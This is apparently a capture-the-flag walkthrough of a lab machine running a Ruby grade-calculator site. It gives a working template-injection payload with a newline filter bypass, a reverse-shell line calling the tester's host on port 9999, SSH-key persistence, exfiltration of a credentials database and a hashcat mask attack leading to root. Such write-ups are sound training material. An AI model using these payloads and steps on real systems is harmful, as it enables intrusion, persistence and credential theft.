## Info Gathering (Round 1)
IP: 10.129.52.153
Website: http://10.129.52.153
## Scan & Eval (Round 1)

#### NMAP Initial
```
Nmap scan report for 10.129.52.153
Host is up (0.048s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Info Gathering (Round 1)
#### NMAP Results
- Detected both port 22 and 80 for SSH and HTTP
- No other port of interest identified with the common port scan
- Running Ubuntu Linux and an NGINX webserver
#### http://10.129.52.153
- A site with the Title "Weighted Grade Calculator"
	- Contains a 'weighted-grade" form at http://10.129.52.153/weighted-grade
		- Form triggers a post request
		- Upon investigation the inputs may be to be utilized for a Server Side Template Attack
			- Attempting `<%= foobar %>` returns `Malicious input blocked` which may signify some kind of sanitization.
	- **Powered by WEBrick 1.7.0**
	- Attempting directory traversal resulted in a 404 message and the following.
```
## Sinatra doesn’t know this ditty.

![](http://127.0.0.1:3000/__sinatra__/404.png)

Try this:

get '/etc/passwd' do
  "Hello World"
end
```
- With the site utilizing WEBrick and Sinatra we can conclude it is running Ruby.
	- This is back up by the Server header `Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)`
		- There is a potential Header Injection vulnerability [Exploit DB](https://www.exploit-db.com/exploits/35352)
## Exploitation (Round 1)
#### Server Side Template Injection
- Attempts with the Category field result in `Malicious input blocked`
- Attempting to submit the form with arbitrary data in the *Grade* and *Weight* category result in Javascript validation.
	- Bypassing the Javascript validation and attempting the attack on the *Grade* and *Weight* field also results in `Malicious input blocked`
- The `Malicious input blocked` appears to be vulnerable to a `%0A` bypass.
Utilizing the following POST payload I received a valid response from the server.
```
category1=abc%0A<%25%3dsystem("whoami")%25>&grade1=100&weight1=20&category2=b&grade2=100&weight2=20&category3=c&grade3=100&weight3=20&category4=d&grade4=100&weight4=20&category5=e&grade5=100&weight5=20
```
The response below appears to responded `true` to the `system("whoami")` function.
```
Your total grade is 100%<p>abc
true: 20%</p><p>b: 20%</p><p>c: 20%</p><p>d: 20%</p><p>e: 20%</p>
```
Replacing `system("whoami")` with `<%= File.open('/etc/passwd').read %>` results in a successful read of `/etc/passwd`
```
Your total grade is 100%<p>abc
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
susan:x:1001:1001:Susan Miller,,,:/home/susan:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
: 20%</p><p>b: 20%</p><p>c: 20%</p><p>d: 20%</p><p>e: 20%</p>
```
- Utilizing `spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.35",9999))` I was able to get a reverse shell.
	- Stabilizing the shell with `python -c 'import pty; pty.spawn("/bin/bash")'` reveals that we are the user Susan
	- Added public key to `/home/susan/.ssh/authorized_keys` to gain persistence and SSH login.

## Scan & Eval (Round 2)
#### Linpeas - Potential Attack Vectors
```
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
```

#### Manual Search
- There is `/home/susan/Migration` that contains a file `pupilpath_credentials.db`
	- `strings pupilpath_credentials.db` reveals the following users and password hashes
```
Stephen Locke154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
```
- Exfil'd the `pupilpath_credentials.db` file and used `sqlite` to `SELECT * from users;`
```
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```
#### Hash Cracking
- Hashes appear to be SHA265
- Both *Wordlist* and *Bruteforce* attacks resulted in no immediate solution.
#### Manual Search (Round 2)
- After further review of `linpeas.sh` output there appears to be a mail directory
```
╔══════════╣ Searching installed mail applications
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄              
╔══════════╣ Mails (limit 50)
    39937      4 -rw-r-----   1 root     susan         625 May 14  2023 /var/mail/susan
    39937      4 -rw-r-----   1 root     susan         625 May 14  2023 /var/spool/mail/susan
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
```
- Running `cat /var/mail/susan` results in the following output
```
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```
#### Hash Cracking (Round 2)
- Utilizing the above email I re-crafted the `hashcat` command to the following
```
hashcat -a3 -m1400 ./hashes --username -o ./recovered susan_nasus_?d?d?d?d?d?d?d?d?d?d --increment
```
- Running the above command resulted in a **Cracked** password: `susan_nasus_413759210`

## Exploitation (Round 2)
#### Susan's Jupiter Grades Password
- Running `sudo -i` with Susan's Jupiter Grades password gains root shell

# Complete
